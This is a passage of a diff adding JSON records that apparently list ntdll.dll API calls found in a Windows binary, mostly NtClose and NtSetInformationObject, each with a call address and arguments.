+   "api": "RtlLeaveCriticalSection",
+   "args": []
+  },
+  {
+   "call_addr": 5368900166,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEnterCriticalSection",
+   "api": "RtlEnterCriticalSection",
+   "args": []
+  },
+  {
+   "call_addr": 5368900418,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x106f0)"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x10708)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368900525,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x10708)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368900625,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlLeaveCriticalSection",
+   "api": "RtlLeaveCriticalSection",
+   "args": []
+  },
+  {
+   "call_addr": 5368900897,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368900946,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368900982,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368900997,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901025,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901040,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901074,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901089,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901287,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901302,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901617,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368901666,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368901702,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901717,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901745,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901760,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901790,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901805,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901893,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368901908,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368902897,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368902978,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368903014,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903029,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903057,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903072,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903098,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903113,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903213,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903228,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368903987,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368904041,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368904077,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904092,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904120,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904135,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904169,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904184,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904433,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368904498,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368904534,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904549,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904577,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904592,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904626,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904641,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904845,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904860,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368904952,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368905006,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368905042,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905057,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905085,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905100,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905134,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905149,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905342,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905357,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905400,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905415,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905478,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368905532,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368905568,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905583,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905611,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905626,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905660,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905675,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905871,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368905886,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368906946,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368907016,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368907056,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907071,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907099,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907114,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907151,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907166,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907279,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907634,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907683,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907747,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907796,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907844,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368907893,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908014,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368908061,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368908272,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368908351,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368908387,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908402,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908430,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908445,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908471,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908486,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908571,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908586,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909798,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368909852,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368909888,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909903,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909931,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909946,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909979,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909994,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910087,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910102,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910376,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368910437,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368910473,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910488,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910516,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910531,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910564,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910579,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910672,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368910687,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911052,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368911113,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368911149,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911164,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911188,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911203,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911227,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911242,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911367,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368911428,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368911464,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911479,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911503,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911518,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911542,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368911557,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912241,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368912311,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368912351,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912366,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912394,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912409,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912446,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912461,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912558,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912573,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912619,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912634,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912698,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368912768,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368912808,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912823,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368912851,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
